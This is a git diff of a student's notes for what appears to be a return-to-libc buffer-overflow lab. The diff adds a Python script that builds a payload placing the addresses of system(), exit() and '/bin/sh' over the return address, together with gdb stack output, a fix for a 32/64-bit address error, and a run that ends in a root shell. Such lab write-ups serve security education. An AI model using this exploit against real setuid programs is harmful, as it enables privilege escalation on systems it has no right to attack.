@@ -59,42 +59,99 @@
             }
             ```
         ```
-        $ gcc -o prtenv prtenv.c
-        ffffe3e5
-        $ gcc -o prtenv prtenv.c
-        ffffe3e5
+        $ ./prtenv
+        ffffe3fd
+        $ ./prtenv
+        ffffe3fd
         ```
 
 ## Task 3: Launching the Attack
 - when we run `retlib` with a benign input, we can know the value of `ebp` and `&buffer`
-    ```
-    Address of buffer[] inside bof(): 0xffffcd60
-    Frame Pointer value inside bof(): 0xffffcd78
-    ```
 - **IMPORTANT**: if we use `p $ebp` to check the value of `ebp` in `gdb` when in `bof()`, we will get a different value, because `gdb` run this program with its absolute path, and `gdb` sets some extra environment variables
-- create the payload in `badfile` with `exploit.py`
+- however, we don't need the exact value of `ebp`, we only need to know `$ebp-&buffer`, it's 24
+- create the payload in `badfile` with `exploit.py` (the initial version)
     ```
     #!/usr/bin/env python3
     import sys
 
-    buff_addr = 0xffffcd50
-    ebp       = 0xffffcd68
+    offset = 24
 
     content = bytearray(0xaa for i in range(300))
 
-    X = 0
-    sh_addr = 0xffffe3e5 # The address of "/bin/sh"
+    X = offset + 12
+    sh_addr = 0xffffe3fd # The address of "/bin/sh"
     content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')
 
-    // return to system()
-    Y = ebp - buff_addr + 4
-    system_addr = 0xf7e12420 # The address of system()
+    Y = offset + 4
+    system_addr = 0xf7e0d370 # The address of system()
     content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')
 
-    Z = 0
-    exit_addr = 0xf7e04f80 # The address of exit()
+    Z = offset + 8
+    exit_addr = 0xf7dffed0 # The address of exit()
     content[Z:Z+4] = (exit_addr).to_bytes(4, byteorder='little')
     ```
+- **trouble shooting**
+    - after generating a new `badfile`, run `./retlib`, it doesn't spawn a new shell
+    - debug `retlib` with `gdb`, in the `bof()`, we can see the stack information
+        ```
+        ...
+        0040| 0xffffcd08 --> 0xaaaaaaaa
+        0044| 0xffffcd08 --> 0xf7e0d370 (<system>:   endbr32)
+        0048| 0xffffcd08 --> 0xf7dffed0 (<exit>:   endbr32)
+        0052| 0xffffcd08 --> 0xffffe3fd
+        0056| 0xffffcd08 --> 0xaaaaaaaa
+        ...
+        gdb-peda$ x/s 0xffffe3fd
+        0xffffe3fd:   <error: Cannot access memory at address 0xffffe3fd>
+        ```
+    - the problem is that the address of the string `"/bin/sh"` is not accessible by the program
+
+    - **FIX**: after analyzing, the prolem is that when compiling `prtenv.c`, I didn't add `-m32` flag, so the program is a 64-bit program, it gave a warning that the size of `unsigned int` and `char*` is different when converting, so in this case, I actually got the lower 32 bits of a 64-bit address, which was not the 32-bit address of the string "/bin/sh", the correct address is `0xffffd3fd`
+    - after compile `prtenv.c` with `-m32` flag and get the correct address, generate the new `badfile`, then run `./retlib`, we got a shell with root privilege 
+        ```
+        $ ./retlib
+        Address of input[] inside main(): 0xffffcd90
+        Input size: 300
+        Address of buffer[] inside bof(): 0xffffcd60
+        Frame Pointer value inside bof(): 0xffffcd78
+        # whoami
+        root
+        ```
+- variations
+    1. try attack without including the address of `exit()` in the payload (still works)
+        - another variation: the original attack prompts a new shell, to see how the program behave after `system()` finishs execution, use another command `export MYSHELL=/bin/ls`
+        - with `exit()`
+            ```
+            ./retlib
+            Address of input[] inside main(): 0xffffcd90
+            Input size: 300
+            Address of buffer[] inside bof(): 0xffffcd60
+            Frame Pointer value inside bof(): 0xffffcd78
+            exploit.py    prtenv     retlib    retlibnewxxxxxxx
+            badfile       Makefile   prtenv.c  retlib.c
+            ```
+        - without `exit()`
+            ```
+            ./retlib
+            Address of input[] inside main(): 0xffffcd90
+            Input size: 300
+            Address of buffer[] inside bof(): 0xffffcd60
+            Frame Pointer value inside bof(): 0xffffcd78
+            exploit.py    prtenv     retlib    retlibnewxxxxxxx
+            badfile       Makefile   prtenv.c  retlib.c
+            Segmentation fault (<---- THE PROGRAM DIDN'T END NORMALLY)
+            ```
+        - we can see that `exit()` ensures the program to end normally
+    2. change the length of name of `retlib` (not work anymore, because the name of the program will be stored in the arguments, changing the length of it may cause some addresses to change)
+        ```
+        $ ./retlib
+        Address of input[] inside main(): 0xffffcd80
+        Input size: 300
+        Address of buffer[] inside bof(): 0xffffcd50
+        Frame Pointer value inside bof(): 0xffffcd68
+        Segmentation fault
+        ```
+
 - stack before return to `system()`
     ```
     High Memory Addresses
@@ -132,3 +189,7 @@
     |          +---------------------+
     Low Memory Addresses
     ```
+
+## Task 4: Defeat Shell's Countermeasure
+
+## Task 5: Return-Oriented Programming
